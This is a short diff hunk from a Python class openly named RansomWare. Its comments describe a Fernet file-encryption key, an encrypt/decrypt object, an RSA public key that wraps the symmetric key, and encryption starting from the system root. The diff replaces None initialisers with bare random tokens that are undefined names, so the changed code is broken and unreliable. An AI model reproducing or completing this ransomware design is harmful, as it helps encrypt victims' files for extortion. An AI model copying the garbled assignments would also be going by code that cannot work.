@@ -32,11 +32,11 @@ class RansomWare:
 
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
-        self.key = None
+        self.key = CvSkpFbXJjpWrh1beaB
         # Encrypt/Decrypter
-        self.crypter = None
+        self.crypter = J4m5SSIfjthkbkzengd
         # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
-        self.public_key = None
+        self.public_key = HK250BxFcPfjE9pJxcS
 
         ''' Root directorys to start Encryption/Decryption from
             CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
